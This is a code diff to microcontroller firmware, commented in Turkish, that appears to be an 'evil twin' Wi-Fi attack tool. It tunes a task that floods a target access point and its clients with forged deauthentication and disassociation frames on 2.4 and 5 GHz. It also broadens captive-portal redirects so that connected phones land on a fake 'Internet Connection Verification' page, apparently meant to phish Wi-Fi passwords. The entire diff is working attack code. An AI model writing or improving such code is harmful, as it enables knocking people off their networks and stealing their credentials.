@@ -234,16 +234,18 @@ void DNSServer::packetHandler(void *arg, struct udp_pcb *udp_pcb, struct pbuf *u
 #define FLASH_BUF_SIZE   256
 #define FLASH_OFFSET     0x00100000 
 
-// ═══════════════════════ ULTRA HIZLI DEAUTH AYARLARI ═════════════════════════
-#define DEAUTH_BURST_INTERVAL_MS    80
-#define DEAUTH_FRAME_COUNT_2G       6
-#define DEAUTH_FRAME_COUNT_5G       8
-#define DEAUTH_TASK_DELAY_2G        3
-#define DEAUTH_TASK_DELAY_5G        2
-#define CHANNEL_SWITCH_DELAY_MS     8
-#define EXTRA_BURST_COUNT_2G        2
-#define EXTRA_BURST_COUNT_5G        4
-#define EXTRA_BURST_DELAY_MS        1
+// ═══════════════════════ DEAUTH AYARLARI (SKB BUFFER SAFE) ════════════════════
+#define DEAUTH_BURST_INTERVAL_MS    120
+#define DEAUTH_FRAME_COUNT_2G       4
+#define DEAUTH_FRAME_COUNT_5G       4
+#define DEAUTH_TASK_DELAY_2G        15
+#define DEAUTH_TASK_DELAY_5G        12
+#define CHANNEL_SWITCH_DELAY_MS     10
+#define EXTRA_BURST_COUNT_2G        1
+#define EXTRA_BURST_COUNT_5G        2
+#define EXTRA_BURST_DELAY_MS        10
+#define DEAUTH_FRAME_INTER_DELAY_MS 3
+#define DEAUTH_SKB_BACKOFF_MS       20
 
 // ═══════════════════════ SCAN PARAMETRELERI (FIX) ═════════════════════════════
 #define SCAN_TIMEOUT_MS             15000   // Scan için timeout
@@ -604,7 +606,19 @@ void startConnectTask() {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ═══════════ DEAUTH GÖREVİ (ULTRA FAST - 2.4GHz & 5GHz TURBO) ═════════════════
+// ═══ SKB-SAFE frame gönderici: hata durumunda backoff uygular ════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+static inline void safeSendMgnt(uint8_t *frame, uint16_t len) {
+  int ret = wext_send_mgnt(WLAN0_NAME, (char*)frame, len, 0);
+  if (ret < 0) {
+    vTaskDelay(pdMS_TO_TICKS(DEAUTH_SKB_BACKOFF_MS));
+  } else {
+    vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_INTER_DELAY_MS));
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ═══════════ DEAUTH GÖREVİ (SKB BUFFER KORUMALR - 2.4GHz & 5GHz) ═══════════
 // ═══════════════════════════════════════════════════════════════════════════════
 void deauthTask(void *param) {
   (void)param;
@@ -615,7 +629,7 @@ void deauthTask(void *param) {
     0x00, 0x00, 0x07, 0x00 
   };
   
-  Serial.println("\n[Deauth] ⚡ ULTRA FAST TURBO MODE BAŞLANDI! 2.4GHz & 5GHz HIZLI DEAUTH ⚡");
+  Serial.println("\n[Deauth] ⚡ DEAUTH BAŞLANDI! 2.4GHz & 5GHz (SKB Buffer Korumalı) ⚡");
   
   unsigned long last_deauth_burst = millis();
 
@@ -626,12 +640,12 @@ void deauthTask(void *param) {
     }
 
     if (millis() - last_deauth_burst < DEAUTH_BURST_INTERVAL_MS) {
-      vTaskDelay(pdMS_TO_TICKS(1));
+      vTaskDelay(pdMS_TO_TICKS(5));
       continue;
     }
     last_deauth_burst = millis();
 
-    // 2.4GHz TURBO DEAUTH
+    // 2.4GHz DEAUTH
     wifi_set_channel(target_channel);
     vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
     
@@ -649,17 +663,17 @@ void deauthTask(void *param) {
           memcpy(&frame_template[16], temp_bssid, 6);
           memset(&frame_template[4], 0xFF, 6);
           frame_template[0] = 0xC0; frame_template[24] = 0x07;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          safeSendMgnt(frame_template, 26);
           
           frame_template[24] = 0x02;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          safeSendMgnt(frame_template, 26);
 
           memcpy(&frame_template[4], temp_bssid, 6);
           frame_template[0] = 0xC0; frame_template[24] = 0x07;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          safeSendMgnt(frame_template, 26);
           
           frame_template[0] = 0xA0; frame_template[24] = 0x07;
-          wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+          safeSendMgnt(frame_template, 26);
       }
       vTaskDelay(pdMS_TO_TICKS(DEAUTH_TASK_DELAY_2G));
     }
@@ -675,15 +689,14 @@ void deauthTask(void *param) {
                 memcpy(&frame_template[16], temp_bssid, 6);
                 memset(&frame_template[4], 0xFF, 6);
                 frame_template[0] = 0xC0; frame_template[24] = 0x07;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                safeSendMgnt(frame_template, 26);
+                safeSendMgnt(frame_template, 26);
             }
         }
         vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
     }
 
-    // 5GHz TURBO DEAUTH
+    // 5GHz DEAUTH
     int32_t ch5g = target_5g_channel;
     uint8_t bssid5g[6];
     memcpy(bssid5g, target_5g_bssid, 6);
@@ -706,17 +719,17 @@ void deauthTask(void *param) {
                 memcpy(&frame_template[16], temp5g, 6);
                 memset(&frame_template[4], 0xFF, 6);
                 frame_template[0] = 0xC0; frame_template[24] = 0x07;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                safeSendMgnt(frame_template, 26);
                 
                 frame_template[24] = 0x02;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                safeSendMgnt(frame_template, 26);
 
                 memcpy(&frame_template[4], temp5g, 6);
                 frame_template[0] = 0xC0; frame_template[24] = 0x07;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                safeSendMgnt(frame_template, 26);
                 
                 frame_template[0] = 0xA0; frame_template[24] = 0x07;
-                wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                safeSendMgnt(frame_template, 26);
             }
             vTaskDelay(pdMS_TO_TICKS(DEAUTH_TASK_DELAY_5G));
         }
@@ -732,10 +745,8 @@ void deauthTask(void *param) {
                     memcpy(&frame_template[16], temp5g, 6);
                     memset(&frame_template[4], 0xFF, 6);
                     frame_template[0] = 0xC0; frame_template[24] = 0x07;
-                    wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                    wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                    wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
-                    wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+                    safeSendMgnt(frame_template, 26);
+                    safeSendMgnt(frame_template, 26);
                 }
             }
             vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
@@ -743,7 +754,7 @@ void deauthTask(void *param) {
     }
     
     wifi_set_channel(target_channel);
-    vTaskDelay(pdMS_TO_TICKS(1));
+    vTaskDelay(pdMS_TO_TICKS(5));
   }
   vTaskDelete(NULL);
 }
@@ -791,6 +802,7 @@ static const char CSS_STR[] PROGMEM =
 void sendChunkedCSS(WiFiClient &client) {
   const char *p = CSS_STR;
   while (*p) {
+    if (!client.connected()) return;
     int len = 0;
     while (p[len] != '\0' && len < 512) len++;
     client.write((const uint8_t *)p, len);
@@ -809,10 +821,12 @@ void sendOfflineScript(WiFiClient &client) {
 }
 
 void sendStartPage(WiFiClient &client) {
+  if (!client.connected()) return;
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
   client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ağ Yapılandırma Sihirbazı</title>");
   sendChunkedCSS(client);
+  if (!client.connected()) return;
   client.print("</head><body>");
   sendOfflineScript(client);
   
@@ -885,11 +899,12 @@ void sendSwitchingPage(WiFiClient &client) {
 }
 
 void sendPortalPage(WiFiClient &client, bool show_result) {
+  if (!client.connected()) return;
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
   client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>İnternet Bağlantı Doğrulaması</title>");
   sendChunkedCSS(client);
-
+  if (!client.connected()) return;
   client.print("</head><body>");
   sendOfflineScript(client);
   
@@ -944,13 +959,13 @@ void sendPortalPage(WiFiClient &client, bool show_result) {
 void handleClient(WiFiClient &client) {
   static char hbuf[896];
   int total = 0;
-  unsigned long first_byte_deadline = millis() + 150;
+  unsigned long first_byte_deadline = millis() + 600;
   unsigned long full_header_deadline = 0;
 
   while (client.connected() && total < (int)sizeof(hbuf) - 1) {
     int avail = client.available();
     if (avail > 0) {
-      if (full_header_deadline == 0) full_header_deadline = millis() + 100;
+      if (full_header_deadline == 0) full_header_deadline = millis() + 400;
       int toRead = avail;
       if (toRead > (int)sizeof(hbuf) - 1 - total) toRead = (int)sizeof(hbuf) - 1 - total;
       int n = client.read((uint8_t*)hbuf + total, toRead);
@@ -962,7 +977,7 @@ void handleClient(WiFiClient &client) {
     } else {
       if (full_header_deadline > 0 && millis() > full_header_deadline) break;
       if (full_header_deadline == 0 && millis() > first_byte_deadline)  break;
-      delayMicroseconds(100);
+      delayMicroseconds(200);
     }
   }
   if (total == 0) return;
@@ -991,23 +1006,48 @@ void handleClient(WiFiClient &client) {
     }
   }
 
-  bool path_is_captive = strstr(rawpath, "hotspot-detect") != NULL
-                      || strstr(rawpath, "generate_204")   != NULL
+  bool is_generate_204  = strstr(rawpath, "generate_204")  != NULL;
+  bool path_is_captive  = is_generate_204
+                      || strstr(rawpath, "hotspot-detect") != NULL
                       || strstr(rawpath, "redirect")       != NULL
                       || strstr(rawpath, "connecttest")    != NULL
                       || strstr(rawpath, "ncsi")           != NULL
                       || strstr(rawpath, "canonical")      != NULL
-                      || strstr(rawpath, "success")        != NULL
+                      || strstr(rawpath, "success.html")   != NULL
                       || strstr(rawpath, "mobile/status")  != NULL
                       || strstr(rawpath, "library/test")   != NULL
                       || strstr(rawpath, "internet_check") != NULL
-                      || strstr(rawpath, "wpad.dat")       != NULL;
-  bool host_is_foreign = (hostbuf[0] != '\0' && strcmp(hostbuf, AP_IP_ADDR) != 0);
+                      || strstr(rawpath, "wpad.dat")       != NULL
+                      || strstr(rawpath, "gen_204")        != NULL
+                      || strstr(rawpath, "check_network")  != NULL
+                      || strstr(rawpath, "wispr")          != NULL;
+  bool host_is_foreign  = (hostbuf[0] != '\0' && strcmp(hostbuf, AP_IP_ADDR) != 0);
 
+  // Android için /generate_204: 302 redirect gönder (popup tetikler)
+  if (is_generate_204) {
+    client.print(buildRedirect());
+    client.flush();
+    return;
+  }
+
+  // Diğer captive detection path'leri veya yabancı host → redirect
   if (path_is_captive || host_is_foreign) {
     client.print(buildRedirect());
     client.flush();
     return;
+  }
+
+  // ap_switched modunda: portal sayfası dışındaki her istek → redirect
+  // (Host header parse edilemese bile captive portal açılır)
+  if (ap_switched) {
+    bool is_portal_path = (strcmp(rawpath, "/") == 0)
+                       || (strcmp(rawpath, "/connect") == 0)
+                       || (strstr(rawpath, "/status") != NULL);
+    if (!is_portal_path) {
+      client.print(buildRedirect());
+      client.flush();
+      return;
+    }
   }
 
   String request(hbuf);
@@ -1334,10 +1374,10 @@ void loop() {
   }
 
   WiFiClient client = server.available();
-  if (client) {
+  if (client && client.connected()) {
     portal_busy = true;
     handleClient(client);
-    client.flush();
+    if (client.connected()) client.flush();
     client.stop();
     portal_busy = false;
   }
